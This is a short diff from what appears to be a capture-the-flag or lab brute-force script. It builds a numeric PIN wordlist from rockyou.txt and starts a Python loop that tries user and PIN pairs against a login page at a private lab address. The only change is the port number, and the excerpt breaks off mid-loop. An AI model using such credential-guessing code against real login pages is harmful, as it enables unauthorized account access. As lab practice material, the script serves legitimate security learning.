@@ -8,7 +8,7 @@ cat /usr/share/wordlists/rockyou.txt | grep "^[0-9]" > pins.txt
 #3 
 import requests
 import sys
-url = 'http://10.0.2.121:5006/login'
+url = 'http://10.0.2.121:5000/login'
 with open('/home/alienum/Desktop/users.txt') as users:
   for u in users:
     with open('/home/alienum/Desktop/pins.txt') as pins:
